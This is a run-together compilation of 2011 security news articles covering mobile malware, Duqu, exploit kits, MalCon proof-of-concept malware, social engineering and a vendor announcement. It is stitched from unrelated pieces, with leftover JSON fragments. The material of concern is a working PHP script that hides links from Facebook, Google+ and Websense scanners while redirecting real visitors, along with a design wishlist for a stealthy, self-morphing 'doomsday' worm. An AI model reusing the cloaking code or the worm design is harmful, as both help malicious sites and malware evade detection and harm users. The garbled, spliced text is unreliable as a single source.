The Article is taken from our September Month Magazine Edition .Here we go.. Mobile technology, particularly smartphones, has come of age and is increasingly replacing PCs for internet surfing, emails, gaming and social networking. As per a recent survey by Neilson Media Research, smartphones now comprise over 38% of the U.S. Cellphone Market and will become the majority by end of the year. To meet this growing demand, cellphone companies are fast churning out new models with killer features, latest and greatest in technology. With this growth it has also come to attention that security of these devices cannot be left behind. Every day a new data breach is making headlines suggesting hackers have gone into overdrive. However, what is of particular interest is that a bulk of them is being attributed to cellphones. Hacking alone accounted for $3.2 billion in losses for the telecom industry, says CFCA. The culprits are many. Several companies like Apple and Google own online application store that allow 3rd party developers to upload programs that can be made available for download by the users. Many users are deceived into downloading applications that appear to be legitimate. The terms are conditions are loosely defined which makes them easy to accept. Once on the device, the “app” can do a variety of damage, and at times without alarming the user. The App Genome Project by the company Lookout showed that in a study of 100,000 apps for iPhones and Android devices, a substantial proportion contained code which could pose a security risk. In another recent finding, security researchers at Trend Micro discovered a malware on Android devices that disguised itself as a Google+ app. The app was capable of performing malicious activities like recording phone calls and gathering GPS location, and more. This user data was then uploaded on a remote server. The application called itself Google++, which apparently was overlooked by several customers. It’s worth mentioning here that a big factor in the working of a malware is the casual behavior of the user, who fails to pay enough attention when installing a program on their device. In another report, SMS Android Trojan was hidden inside a movie player app and, once installed, would send out premium text messages. Many such malwares and viruses combined have affected up to 250,000 android devices to date. The rationale behind making smartphone the target by hackers is very simple. A smart phone today not only stores contacts but also other sensitive information like emails, pictures, and more. And in the case of some devices, a history of user visited locations with timelines. The faster and improved cellular networks and Wi-Fi capability have made handheld computing very convenient, making it a widely accepted product. Hence, it has attracted the attention of hackers with malicious intent. This increased visibility has, however, put pressure on software companies as well as hardware manufacturers to provide security features and configuration options. Facebook now offers its users secure logging via SSL on their wireless devices by activating an account setting. Twitter followed suit by enabling “always-on SSL” and thereby keeping user data secure even when connected through a public Wi-Fi. The users too need to be vigilant of their devices. In case of a lost device, remote erasure of data or locking of the device is recommended. An alternative is to trigger the remote kill switch which will render the phone dead. If the device contains sensitive information, it is recommended to store digital assets in encrypted folders. Other simple tricks include keeping the Bluetooth off and in non-promiscuous mode at all times, unless when in-use. Contacts, photos and videos should be periodically backed-up in a safe location, preferably encrypted. Several anti-virus software compatible with various OS platforms are available for download from online application markets to help make sure that mobile devices are as secure as possible.

We would Like to share this article with our website readers also. You can Download November Issue Here. This is a theoretical prima to bring out a discussion about whether an Internet doomsday worm can be created that is so intractable that it cannot be eradicated. This worm could also have the ability to carry multiple weaponized payloads. Can a doomsday worm shut down the Internet? I don't think anyone could shut down the Internet but I believe a worm can definitely create access problems. An intractable type of malware agent is not an abstract concept or science fiction. A doomsday like virus has been plaguing the U.S.Drone fleet. They keep trying to disinfect their hard drives but it keeps coming back. The Pentagon has been plagued by the worm agent.btz; they are still trying to remove it after 3 years. Some analyst think agent.btz was created by China. The Drone’s highly secure pc’s and networks are not connected to the internet. The infection was introduced by mobile media like zip drives and cds. Let’s put together the best aspects of worms and biological infectious agents. The AIDS virus has confounded medical science for number of years. It seems to be one of the most successful viruses in modern history. From the article “Why Diseases Such As AIDS Are So Successful and So Deadly:” “Cell-to-cell transmission is a thousand times more efficient, which is why diseases such as AIDS are so successful and so deadly,” writes Mothes. “And because the retroviruses are already in cells, they are out of reach of the immune system.” The statement, “Cell-to-cell transmission is a thousand times more efficient” is the best analogy to social networking sites that have the greatest transmission throughput. On the second line, “They are out of the reach of the immune system,” compares if you take a corporation with 1,000 nodes that are infected it’s easy for data security to push down a solution and remove the worm. The PCs that are actually outside the immune system are almost always home PCs, iPods, Android phones, and small network PC groups. What else can we learn about a biological model? If you walked into the middle of crowded room and asked if anyone knew Mary Mallon or Gaetan Dugas, you’d probably have a lot blank stares. Gaetan Dugas was the AIDS patient zero, and Mary Malone was the infamous Typhoid Mary. They share some similarities that helped them to infect a lot of people. They appeared healthy and did not have any outward signs of any health issues. The gestation period for AIDS was more than 10 years and Dugas infected a lot of men during that time. Mary Mallon was a cook. She handled food and utensils, and at one time, she worked in a hospital. Mary she was a carrier of typhoid but did not get sick. Some of these ideas could build a good model for a worm. With the above and what I know of malware, let’s build a model: It would have to operate in the noise level of the Internet. It would have to behave as a WebCrawler or spider to stay off of the radar of malware companies. It would have to infect its hosts with minimal discomfort; that is, minimally slow them down or it make it appear as if it was not a type of malware that somebody would want take the effort to remove. It would have to infect very slowly. It would have to be self-aware—it would have to recognize itself trying to re-infect a host. A model would have to be built for it to judge how its growth rate would have to be modulated. AIDS had a gestation of up to 10 years. A gestation time on the Internet of only one year would be an incredibly long time. The worm would have to be modular enough to take different payloads. It would have to try to just infect home PCs. Home PCs have been deluged with strange malware and bogus antivirus pop-up ads. Recently, Microsoft tried to issue a malware solution. This antimalware flagged Goggle Chrome as a Trojan, and actually removed Goggle Chrome from a number of PCs. It may also contain code to write to places on hard drives that are normally inaccessible to antimalware programs. It would have to self morph, it would have to evolve. Be able to present different signatures to antimalware. It would have to be able to target specific IP addresses. It would have to reach a certain critical mass before reveling itself. What kind of weapon would this doomsday worm be ? Depending on payload, it can have multiple objectives. For example ,it can be a psychological, financial or political weapon. Today people are addicted to the internet for face book and other social sites. People denied their daily internet fix would be more anxious and depressed. As a political tool it can slow down the internet right before an election. The incumbent party will receive most of the blame. Today many people use the internet for their financial transactions. Selling stock transferring money etc. any disruption on the information super highway. Slowing down the internet during financial market volatility can have very negative affect. A country that gets the first doomsday worm on the internet has won the equivalent to space race. Having a doomsdays worm can be the equivalent to the 1957 Sputnik launch. I got the idea for a doomsday worm from a Chinese hacker website. I don’t speak Chinese, so I had to use Google Translate, and as they say sometimes things get lost in the translation." }

Second Recent Attack by Blackhole Exploit discovered in thousands of WordPress websites that use a popular non-updated TimThumb image tool. Avast senior researcher Jan Sirmer found attackers had exploited weak FTP server authentication credentials and a vulnerability in the TimThumb image resizer to upload malicious PHP files to the site. But this is not the only way for example they use stolen passwords to direct FTP changes.In your FTP, alongside other site files, a new file will appear that looks like this: ./wp-content/w3tc/min/a12ed303.925433.js or ./wp-includes/js/l10n.js The attack used the BlackHole exploit kit, which redirected the website's visitors to an external malware-hosting site. Researchers detected an additional 3,500 unique infected WordPress sites, which redirected visitors to malicious sites between Aug. 28 to 31. During September , the company blocked redirects from 2,515 WordPress sites, Sirmer said.

The vulnerability has since been reported to Microsoft and Microsoft is working on a fix for the kernel vulnerability right now. Researchers at the Laboratory of Cryptography and System Security (CrySyS) in Hungary confirmed the existence of the zero-day vulnerability and exploit in a brief note posted to its web site. Our lab, the Laboratory of Cryptography and System Security (CrySyS) pursued the analysis of the Duqu malware and as a result of our investigation, we identified a dropper file with an MS 0-day kernel exploit inside. We immediately provided competent organizations with the necessary information such that they can take appropriate steps for the protection of the users. The installer file is a Microsoft Word document (.doc) that exploits a previously unknown kernel vulnerability that allows code execution. We contacted Microsoft regarding the vulnerability and they're working diligently towards issuing a patch and advisory. When the file is opened, malicious code executes and installs the main Duqu binaries. The chart below explains how the exploit in the Word document file eventually leads to the installation of Duqu. Other security vendors have reported infections in the following countries: • Austria • Hungary • Indonesia • United Kingdom • Iran - infections different from those observed by Symantec. \"Microsoft is collaborating with our partners to provide protections for a vulnerability used in targeted attempts to infect computers with the Duqu malware. We are working diligently to address this issue and will release a security update for customers through our security bulletin process,\" Jerry Bryant, group manager of response communications in Microsoft's Trustworthy Computing group said in a statement. You can find Symantec updated whitepaper (version 1.3) here. Key updates in the Symantec whitepaper include:• An unpatched zero-day vulnerability is exploited through a Microsoft Word document and installs Duqu • Attackers can spread Duqu to computers in secure zones and control them through a peer-to-peer C&C protocol • Six possible organizations in eight countries have confirmed infections • A new C&C server (77.241.93.160) hosted in Belgium was discovered and has been shut down.

Two workers at a web-hosting company called Web Werks told Reuters that officials from India's Department of Information Technology last week took several hard drives and other components from a server that security firm Symantec Corp told them was communicating with computers infected with Duqu. The equipment seized from Web Werks, a privately held company in Mumbai with about 200 employees, might hold valuable data to help investigators determine who built Duqu and how it can be used. But putting the pieces together is a long and difficult process, experts said. \"This one is challenging,\" said Marty Edwards, director of the US Department of Homeland Security's Industrial Control Systems Cyber Emergency Response Team. \"It's a very complex piece of software.\" The Duqu trojan is composed of several malicious files that work together for a malicious purpose.Duqu appears to be more narrowly targeted than Stuxnet as researchers estimate the new trojan virus has infected at most dozens of machines so far. By comparison, Stuxnet spread much more quickly, popping up on thousands of computer systems. Security firms including Dell Inc's SecureWorks, Intel Corp's McAfee, Kaspersky Lab and Symantec say they found Duqu victims in Europe, Iran, Sudan and the United States. They declined to provide their identities. Duqu so named because it creates files with \"DQ\" in the prefix -- was designed to steal secrets from the computers it infects, researchers said, such as design documents from makers of highly sophisticated valves, motors, pipes and switches. Duqu and Stuxnet both use a kernel driver to decrypt and load encrypted DLL (Dynamic Load Library) files. The kernel drivers serve as an \"injection\" engine to load these DLLs into a specific process. This technique is not unique to either Duqu or Stuxnet and has been observed in other unrelated threats. \"We are a little bit behind in the game,\" said Don Jackson, a director of the Dell SecureWorks Counter Threat Unit. \"Knowing what these guys are doing, they are probably a step ahead.\" [Source]" }

Indian security researcher from MalCon has created an advanced and dangerous malware for Apple products which can not only compromize your privacy but also steal important data and let hackers control your device by simple text messages. If you are using any Apple product such as iPhone, iPad or iPod, then you shuuld be concerned. Indian security researcher from MalCon, Atul Alex has created an advanced malware for the Apple products which can not only intercept calls of users, steal data, but also provide a reverse VNC to see remotely all the actions of the victim. The malware can be deployed remotely over the web and is supposed to work on the latest iOS 5. Atul Alex, Technical director of MalCon said \"Apple products are extremely secure by design. The malware works on jailbroken devices - something which over 90% of users have. If your device is not jailbroken, you have nothing to worry about!\". However, over 90% of users normally jailbreak their devices. iOS jailbreaking, or simply jailbreaking, is the process of removing the limitations imposed by Apple on devices running the iOS operating system through use of custom kernels. Such devices include the iPhone, iPod Touch, iPad, and 2nd Gen Apple TV. Jailbreaking allows users to gain root access to the operating system, allowing iOS users to download additional applications, extensions, and themes that are unavailable through the official Apple App Store. A jailbroken iPhone, iPod Touch, or iPad running iOS can still use the App Store, iTunes, and other normal functions, such as making telephone calls. The malware malware boasts of the following features: • Control devices by SMS • Invisible Malware • VNC Server to view remote screen • Record and listen to all calls remotely • Upload / Download user Data • Access all mails and texts The Malware will be demonstrated next month at the upcoming International Malware Conference, MalCon in Mumbai, India. The researcher Atul Alex has previously coded and demonstated a custom malicious firmware for Symbian last year." }

A 15year old Indian security researcher 'Shantanu Gawde' from MalCon Research has created a malware that utilizes the Microsoft xbox kinect controller. Kinect for Xbox 360, or simply Kinect, is a motion sensing input device by Microsoft for the Xbox 360 video game console. With over 10 million devices sold till date, the kinect holds the Guiness book for world record for the fastest selling consumer electronics device - and is exactly the reason why the malware is a concern. In recent months, there have been a number of innovative kinect hacks that make use of the kinect using both Open source drivers and the Kinect SDK. The malware, code-named 'gawde' after its creators name, works on Windows 7 to secretly capture pictures of the victim / surroundings from a connected Kinect device and uploads them to a picasa account. Rajshekhar Murthy, Director at ISAC, (Information Sharing and Anaysis Center), a scientifc non-profit body that holds the International Malware Conference, MalCon said. \"We believe that in coming years, a lot of windows based applications will be developed for Kinect and the device will gain further immense popularity and acceptance- and from a perpective of an attacker, such a popular device can be an exciting target for visual and audio intelligence. At MalCon research labs, we promote proactive security research and the malware utilizing Kinect is only a proof of concept. \" The kienct malware 'gawde' goes a step ahead and even uses voice recognition to execute a program based on keyword, without the knowledge of the victim.

Due to its rootkit technology, the piece of malware can stay hidden from the user, the operating system’s defense mechanism and even from regular antivirus utilities.Just like its predecessor – the Stuxnet rootkit - Rootkit.Duqu.A is digitally signed with a stolen digital certificate that has been revoked in the meantime. This allows it to install itself on both 32- and 64-bit operating systems on Windows platforms ranging from Windows XP to Windows 7. The Duqu rootkit runs on the computer for 36 days and collects any kind of information entered via the keyboard, including passwords, e-mail or IM conversations. After the “surveillance” period ends, the rootkit gracefully removes itself from the system, along with the keylogger component. Rootkit malware is extremely difficult to detect, as it manages to subvert the operating system before it is fully loaded. Rootkit removal can be challenging even for some antivirus solutions, so manual removal is not recommended. We offer a free and fully automated removal tool that takes care of everything for you. You only have to download and run it on the system, then reboot the PC if infection is found. Here is a complete rundown of the steps you need to take: 1. Download the Duqu_Removal_Tool.zip (.zip file), then double-click on it chose \"Extract all files...\" from the File menu, and follow the wizard's instructions. You can use any other decompression utility, like WinZip. 2. Navigate to the folder you have extracted the tool in, find the file called Duqu_Removal_tool.exe and double-click on it. Press the Scan button and let the removal tool scan your PC. 3. If you have Windows Vista with User Access Control enabled, or if you are running as a restricted user in Windows XP, right click the Duqu_Removal_tool.exe program and choose \"Run as Administrator\". You will be prompted to enter credentials for an admin account. 4. Press the OK button when the removal tool asks for a reboot. 5.

US researchers have shown how this is possible using any smartphone available today. At a conference in Chicago on Thursday, a group of computer researchers from Georgia Tech will report on another potential threat. The researchers have shown that the accelerometer and orientation sensor of a phone resting on a surface can be used to eavesdrop as a password is entered using a keyboard on the same surface. They were able to capture the words typed on the keyboard with as much as 80 percent accuracy. Normally when security researchers describe spyware on smartphones, they mean malicious code that can be used to snoop on calls, or to steal the data held on mobile phones.In this case, however, researchers have described how they have put software on smartphones to spy on activity outside the phone itself - specifically to track what a user might be doing on a regular desktop keyboard nearby. The typing detection works by “using a smartphone accelerometer – the internal device that detects when and how the phone is tilted – to sense keyboard vibrations as you type to decipher complete sentences with up to 80% accuracy,” according to the Institute. \"We first tried our experiments with an iPhone 3GS, and the results were difficult to read,\" said Patrick Traynor of Georgia Tech. \"But then we tried an iPhone 4, which has an added gyroscope to clean up the accelerometer noise, and the results were much better. We believe that most smartphones made in the last two years are sophisticated enough to do this attack.\" As phone technology improves, attacks via the accelerometer could become more feasible. The researchers' initial experiments used Apple's iPhone 3GS, but the phone's accelerometer lacked the necessary sensitivity. The researchers then moved to the iPhone 4, which uses a gyroscope to remove noise from the accelerometer data, and had much greater success. \"The way we see this attack working is that you, the phone's owner, would request or be asked to download an innocuous-looking application, which doesn't ask you for the use of any suspicious phone sensors,\" said Henry Carter, one of the study's co-authors . \"Then the keyboarddetection malware is turned on, and the next time you place your phone next to the keyboard , it starts listening.\"" }

About 180,000 pages have been affected so far, security researchers say. Attackers have planted malicious JavaScript on ASP.Net sites that causes the browser to load an iframe with one of two remote sites: www3.strongdefenseiz.in and www2.safetosecurity.rr.nu, according to security researchers at Armorize who discovered the attack. From there, the iframe attempts to plant malware on the visitor's PC via a number of browser drive-by exploits. A drive-by exploit will load malware without a visitor's knowledge or participation (no need to open a file or click on a link). Fortunately, the attackers are using known exploits, with patches available, so the attack can only be successful if a visitor is using an outdated, unpatched browser without the latest version of Adobe PDF or Adobe Flash or Java. Unfortunately, Armorize says that only a few of the most popular antivirus vendors can detect the dropped malware, according to the Virustotal web site. Virtustotal is a security monitoring service offered by Hispasec Sistemas that analyzes suspicious files and URLs. At this time, it says that six antivirus packages out of the 43 it monitors can detect this latest SQL injection attack. These are AntiVir, ByteHero, Fortinet, Jiangmin, McAfee and McAfee-GW-Edition.The attack is targeting users whose default browser language is English, French, German, Italian, Polish or Breton. One of the sites accessed via the iframe is in Russia, the other is in the United States and is hosted by HostForWeb.com, Armorize says. Some of the planted malware accesses a site hosted in the United States, too. Users are advised to take advantage of NoScript in order to protect themselves from this, and many other Web based threats." }

At the psychological skill of Social EngineeringSocial engineering is the human side of breaking into corporate or personal pc’s to gain information. Even companies that have an authentication process, firewalls, vpn’s and network monitoring software are subject to the skill of a good social engineer. In hacking we rely on our technical skill and in social engineering it is a game of getting your subject to tell you what you want to get into their system. Social engineering has been employed since the beginning of mankind, the art of trickery or deception for the purpose of information gathering, fraud, or in modern times, computer system access. In most cases today the social engineer never comes face to face with their target. In social engineering we exploit the attributes of the human decision making process known as “cognitive biases.” That was the question asked by the Team of Social-engineer.org Gurus. Which tactic works best for a scamming social engineer? Acting like an authority figure and requiring a victim to answer questions and give up sensitive information? Or acting like a nice, trustworthy person who strikes up a friendly conversation and just needs the victim to tell them a few things to help them out? They have just released results of a several-months long poll that laid out two different scenarios of how a Social engineer might try and elicit information from a victim. The first showed how the principle of endearment and how it may be used by a malicious social engineer. The example given was a social engineer who attempts to get strangers to engage in very personal conversation with him with little effort. Dressed very casually he grabbed a prop that he felt would endear people to him, a small sign that had a funny slogan on it. As he walked around, looking like a tourist with his prop, he was able to engage people in conversation. \"The fact is we like to deal with people who are like us, but even more powerfully we like to deal with those who LIKE us,\" said Christopher Hadnagy, founder of social-engineer.org and author of Social engineering: The art of human hacking. \"Endearment makes a person feel liked and, in turn, like you. Endearment is used by getting on the same plane as the target, or giving them reasons to like you.\" The second story involved a social engineer employing the authority principle. The social engineer walks into the office with IT tools and a clip board he mumbles how busy he is today. Then looking at the secretary he barks an order, \"I was sent to check your network connectivity and I have no time as I have to do this on 25 other nodes. I need you to log in to your network share with your password as I watch to confirm you can connect.\" \"This works because people fear losing their jobs and there are no methods in place for an employee to port or reject without fear,\" explained Hadnagy. \"Other methods, like carrying a clipboard, looking busy or in control, all of these give off the air of authority and few people will question it.\" Interview with David Kennedy (Member @ Social-engineer.org) Mohit : First, tell us about yourself, your experience and what you have produced in the social engineering field? David : I'm a director of information security for a fortune 1000 company. Don't let the title fool you, being a director just means i can focus on the stuff i love which is breaking things. I have a heavy penetration testing and exploitation background dating back to the military intelligence days as well as a security consultant working with a number of fortune 500 and 1000 companies. As a penetration tester a few years back, social-engineering was a major portion of what i needed to do in order to gain access either physically or through social-engineering attacks against organizations. It's been a blast working in the security community and contributing as much as i can to open source. My philosophy in life is i love what i do and where i work and my goal is to give as much back to the security community and make them successful and help if i can. I'm one of the founders of derbycon, a security conference in louisville kentucky, creator of the social-engineer toolkit, fast-track, member of the social-engineer crew/podcast, and main blog post at http://www.secmaniac.com. Mohit : Please explain what social engineering is and how we use social engineering? David : Social-engineering simply put is the manipulation of human behavior to achieve some task. For us as penetration testers, social-engineering can be leveraged in multiple capacities to compromise an organization and gain access which typically circumvents the majority of security controls in place in an organization. For me, i leverage social-engineering on a regular basis to identify weaknesses within my security program and user awareness. Most organizations are spending a ton of money on the latest shiny technology that promises to fix their security problems while our humans are finding the easiest way to get in. Mohit : What are the best ways to perform social engineering? David : Social-engineering takes some time to learn and something that requires practice. There's no easy answer on what the best way to social-engineer a victim. When i'm going after an organization i look at what they have on the internet, who the personnel is, their language, what companies they own, and as much information i can possibly learn from open source intelligence (osint). I'll develop a pretext (my attack) based on what i learn and practice it before hand to make sure it's perfect and flawless. A lot of times leveraging social networking sites in order to learn a lot of information about my targets is beneficial and leveraging trust with people they trust can always make that little bit of a difference. Mohit : What are the recent usages of social engineering, such as the, hbgary hack by anonymous or rsa hack ? David : I think the most recent one would be the rsa hack where the details are still a bit vague but leveraged spear-phishing in order to target a select amount of people with a flash zero day. We've seen these attacks become more and more prevalent and something we have been preaching on the social-engineer.org podcast for a large time that these types of attacks are coming and it's going to be something really difficult to protect against. Mohit : How did \"SET (Social engineering toolkit)” come about and why did you develop it? David : when set was first conceived chris hadnagy and i were sitting in a chat room on irc talking together and he mentioned he was starting social-engineer.org to try to bring more awareness and education to the community about social-engineering and how it relates directly to security. We started chatting and found that there really was no tool out there for social-engineering and something that was a huge gap for us as penetration testers. Out of that talk, a raw version of set was created which was really basic in nature, it had a mass mailer, some pdf exploits and that was really it. Even with its early, early release it got a ton of positive feedback and it has just grown from there. I never thought for one minute that set would become the lead open source tool in social-engineering and something that penetration testers leverage on a regular basis, it's quite impressive and i'm humbled by it. Mohit : Is social engineering dangerous ? David : social-engineering is extremely dangerous and the largest threat that i see in information security to date. As mentioned before, we have a ton of technology in place that is specifically designed to stop buffer overflows (or detect them), catch malware (kind of a joke at this point), and protect our web applications. Yet our user population is still completely vulnerable and clueless on the signs of a breach. A fine balance between technology and user awareness needs to be accomplished and it'll never be 100 percent but it'll be a lot better than an uneducated user population. Mohit : how does someone master social engineering ? David : Social-engineering requires you to change your behavior, remove your barriers, and start to manipulate humans to do your bidding. I know that sounds awful, but use social-engineering in a positive way at your organization to see if you can affect a decision in your manner. Read and learn from studies on behavioral analysis and how humans interact with one another. Use the social-engineer.org framework to help you get the knowledge to expand on. Ultimately it's going to be yourself learning the techniques and applying them on a regular basis and be able to manipulate your own behavior to get a desired outcome from someone else. Mohit : Give us an overview of the social engineering tools and what it offers. David : The social-engineer toolkit (set) is an open-source python driven arsenal for penetration testers aimed at testing how well an organization can withstand a social-engineer attack. Set has a number of attack vectors specifically aimed at targeting the user population. Set aids a penetration tester in social-engineer attacks however doesn't perform it for them. It's up to the penetration tester to perform intelligence gathering and form their pretext in order to have a successful attack. Set has a number of tools and attacks including the spear phishing module, web attack vectors, teensy usb hid, wireless attack vectors, and a number of additional capabilities and features that make set a unique when it comes to social-engineering and penetration testing. Set is being used internationally by penetration testers and a critical tool to them in every capacity as social-engineering is a highly important attack vector to leverage during normal testing After that great interview with the creator of the Social Engineering Toolkit, David Kennedy, I wondered how many readers really understand the difference in social engineering as opposed to hacking. The truth is social engineering is rarely discussed. People mostly like to talk about cracking and phreaking. Let’s bring social engineering out of the closet and onto discussion blogs. Sharing information, learning the techniques and knowing how to protect yourself from social engineering is the best way to be skilled in this method of hacking. Hadnagy says the poll results further enforce that humans are naturally trusting creatures. But it is that trusting attitude that has led many to being hacked.

The report goes on to claim that, while the use of what is believed to be a pre-existing armoury of Trojans, viruses, malware and military hackers was suggested, the cyber-attack was never actually carried out. The attack would have tried to disrupt Libya's early-warning radar system and thus cripple the North African country's ability to fire back at attacking NATO aircraft.But the Obama administration and the Pentagon chose instead to mount a conventional attack, partly because an American cyberattack might have set a dangerous precedent, and Libya might not have been worth the risk. In the end, American officials rejected cyberwarfare and used conventional aircraft, cruise missiles and drones to strike the Libyan air-defense missiles and radars used by Col. Muammar el-Qaddafi’s government.This previously undisclosed debate among a small circle of advisers demonstrates that cyberoffensives are a growing form of warfare. The question the United States faces is whether and when to cross the threshold into overt cyberattacks. A senior Defense Department official said: “They were seriously considered because they could cripple Libya's air defense and lower the risk to pilots, but it just didn't pan out.” [Source CNET]" }

The facts are based on real vulnerabilities in the way the Internet is constructed. Recent cyber security attacks using sophisticated malware (think Stuxnet) and social engineering techniques have raised the bar for defenders. Cyber Styletto pivots off these cyber events to educate and entertain. It is written as fact-based fiction. The story comes from the minds of Gian DeTorre and Mike Brennan. DeTorre is the pen name of an award winning fiction writer and literary critic whose stories and reviews have been published worldwide. “Cyber Styletto is a new genre in literature, bringing the modern, secretive world of cyber espionage together with a good, old-fashioned thriller,” DeTorre said. I hope our audience has as much fun reading it as we had producing it. Brennan has been a journalist for more than thirty years covering science, technology, and business for newspapers in the US. For the past decade he has been editor and publisher of MITechNews.Com. The cyber security technology featured in the novella has been verified by security expert Richard Stiennon, Chief Research Analyst at IT-Harvest. Stiennon has been in the security field since 1995. He is the author of “Surviving Cyberwar” and technology consultant to Cyber Styletto, the first of a series of novellas that will chronicle today’s very dangerous Internet world. \"Sometimes it is difficult to explain the complexity of advanced cyber attacks. Cyber Styletto succeeds in highlighting the potential for abuse of our networked world by bad actors; and it does so in an entertaining good read!\" Added Brennan: “When I started working with Richard more than a year ago on what we thought would be a great science fiction tale, we had no idea that when we published it our fiction would turn to fact,” Brennan said. “Our plot and many of the characters are ripped from today’s headlines. The novella morphed from a good story to a great read when Gian joined the team. We believe we have written a story every cyber security professional and government policy makers should read carefully.” The eBook sells for $2.99 and is available at Smashwords.Com The paperback sells for $13.37 and is available at LuLu.Com You can reach Brennan via phone at (616) 205-4320. An illustrated paperback version will be released late summer. Cyber Styletto: Read it, learn it, stay secure." }

The version currently in circulation is 2.8, and despite its lower activity for the last half of this year, it remains one of the preferred exploit packs used by cyber-criminals. In comparison to the Black Hole Exploit Pack, the PEK has a similar licensing model. The last version released offered an “alternative” to purchasing the exploit pack. This “alternative” is the Phoenix Exploit’s Kit 2.8 mini. The current licensing model consists of the following: · Simple Domain (Closed) – USD $2,200.00· Multithreaded Domain (Closed) – USD $2,700.00· Extra-Encryption Service (ReFUDing) – USD $40.00 The mini version does not change the characteristics of the Exploit Pack, at least in regards to its graphical interface and functionality in relation to previous versions. Each section has the same type of display and statistical information, which is provided in a minimalistic yet concise manner. Although trivial, this is one of the main reasons for the adoption of Phoenix by cyber-criminals. The ability to easily locate information and merge the functionality of this Exploit Pack with a Malware Kit, such as SpyEye or ZeuS, increases their level of success and attack strategies. The main difference between the full version and the mini version is that the mini version is subject to a domain under the simple mode, while the full version allows multitasking. There isn’t much new about the Exploit Pack. The code has been optimized to increase the success rate of exploitation and the exploit for Java Runtime Environment to Trusted has been added. Also removed were the following exploits pre-compiled in version 2.7: · Windows Help and Support Center Protocol Handler Vulnerability – CVE-2010-1885 · Integer overflow in the AVM2 abcFile parser in Adobe Flash Player – CVE-2009-1869 · Integer overflow in Adobe Flash Player 9 – CVE-2007-0071 · IEPeers Remote Code Execution – CVE-2009-0806 · Internet Explorer Recursive CSS Import Vulnerability – CVE-2010-3971 Although it’s basically the same exploits (similar in all cases, including those incorporating other Exploit Packs in the wild), the author's optimized for each version. In this case, it includes the following exploits: · Microsoft Data Access Components (MDAC) - CVE-2006-0003 · Adobe Reader Javascript Printf Buffer Overflow - CVE-2008-2992 · Adobe Reader LibTiff - CVE-2010-0188 · Adobe Reader Collab GetIcon - CVE-2009-0927 · Java SMB - CVE-2010-0746 · Java Runtime Environment Trusted - CVE-2010-0840 · Java Skyline Plug-in component in Oracle Java SE and Java for Business 6 - CVE-2010-3552 · Java Deployment Toolkit Component - CVE-2010-0886 Despite the optimization of the components for each version, it is interesting that chain optimization and updating MDAC exploits remains the most prevalent, not only in this Exploit Pack but in any of the existing Exploit Packs. What is the reason? It comes down to a lack of experience by the users (application, customers around the basic procedures update) that transforms them into a potential target and highly susceptible through this old, but effective vulnerability.

Even Security Analysts claim that Facebook was notified of these vulnerabilities on July 31st, 2011. To date (October 4, 2011), Facebook has yet to do anything about this. Facebook has only recently purchased Websense to attempt to push this vulnerability under the rug, however the exploit still works.To access Facebook's FQL API, Facebook was even so kind as to give a reference of tables and columns in the documentation for FQL. FQL does not allow the use of JOINS, however it is not needed as everything is thoroughly documented. Attackers can misuse this during the creation of a malicious Facebook application or directly on the FQL development api page for information gathering. : <?php # User agent checking methods $fb_string = '/facebookexternal/i'; # facebookexternal shows in the facebook content scanner's user agent $gplus_string = '/Feedfetcher-Google/i'; # googleplus shows up in the user agent as well. # rDNS Lookup Methods $host_websense = '/websense.com/i'; # Checking the rdns for websense filters $host_fb = '/tfbnw.net/i'; # Checking the rdns for tfbnw.net - facebook host # Load the request properties $u_agent = $_SERVER['HTTP_USER_AGENT']; $u_ref = $_SERVER['HTTP_REFERER']; $u_host = gethostbyaddr($_SERVER['REMOTE_ADDR']); # If we're coming from or facebook or websense or google plus, if (preg_match($host_fb,$u_host) || preg_match($host_websense,$u_host) || preg_match($fb_string,$u_agent) || preg_match($gplus_string,$u_agent)) { # Display an image header('Content-Type: image/jpeg'); @readfile ('/var/www/localhost/cute_kitten.jpeg'); } else { # Rickroll this unsuspecting user header('Location: http://www.youtube.com/watch?v=dQw4w9WgXcQ&ob=av3e'); } ?> While most major sites that allow link submission are vulnerable to this method, sites including Websense, Google+, and Facebook make the requests easily identifiable. These sites send an initial request to the link in order to store a mirror thumbnail of the image, or a snapshot of the website being linked. In doing so, many use a custom user agent, or have IP addresses that resolve to a consistent domain name. Facebook IP addresses resolve to tfbnw.net, also set a custom user agent of \"facebookexternalhit\".Google+ (also notified Jul. 31st and guilty of reasonable care) again follows suit and utilizes \"Feedfetcher-Google\" as their user agent. Knowing this, we can easily filter out requests coming from these websites, and offer up a legitimate image to be displayed on their site, while redirecting or displaying a completely different page to anyone that follows the links. Facebook's recent partnership with Websense is laughable, due to Websense's \"ACE\" security scanner that is just as easily identified, by using gethostbyaddr in order to resolve the IP back to websense.com. Utilizing this technique would allow an overwhelming number of malware sites to remain undetected to their automatic site analysis. Other places like digg.com either spoof a user agent to look like normal traffic, or forward the client's user agent, which makes it more difficult to catch every one of their requests. Fortunately, digg.com only requests the link once, prior to submitting the link to the world. This allows attackers to serve up a legitimate image until that initial request clears our server, and then replace it with a less than honest file. We have affectionately named this vulnerability class Cross-Site Content Forgery.Proof of Concept can be seen here. Submitted By : Blackhat Academy" }

Parts of the bot’s code oddly look like ZeuS code…\" The Aldi Bot can read (saved) passwords from the Firefox web browser, Pidgin IM client and JDownloader download tool, and send them to a command and control server which is included in the €10 price tag. The Aldi Bot can also carry out Distributed Denial-of-Service (DDoS) attacks, as the bot's author demonstrates with a YouTube video showing an attack on the German Bundeskriminalamt (equivalent to the UK CID) web site. The bot can also be set up as a SOCKS proxy to use infected computers as proxies for protocols of the bot herder's choosing. Infecting systems with the discount malware does, however, require additional measures, such as exploit packs on infected web sites." }

Today's point security tools for IT infrastructures are not enough to protect against the new wave of sophisticated cyber attacks. That's why Radware (NASDAQ: RDWR), a leading provider of application delivery and application security solutions for virtual and cloud data centers, today announced Radware Attack Mitigation System (AMS), the industry's first fully integrated IT security strategy and portfolio that protects the application infrastructure in real time against network and application downtime, application vulnerability exploitation, malware spread, information theft, Web service attacks and Web defacement. Additional Resources · AMS Brochure · CTO Expert Article · ERT Incidents Report 1H, 2011 · AMS & SEIM White Paper · Solution Video · SlideShare Presentation Available today, Radware's AMS provides the most comprehensive solution to fight multi-vulnerability campaigns — today's sophisticated, headline-grabbing cyber attacks that probe IT targets for weaknesses and strike with parallel assaults across the infrastructure. These attacks are hard to defend against because they are aimed at multiple layers in the IT architecture, particularly against network infrastructure equipment, servers and applications. Examples of multi-vulnerability attacks include high-volume distributed denial of service (DDoS) attacks as well as \"low & slow\" stealthy attacks, network- and application-based attacks, all of which hit simultaneously at multiple weakness points in the networks while emulating legitimate user behavior making them harder to identify and block. 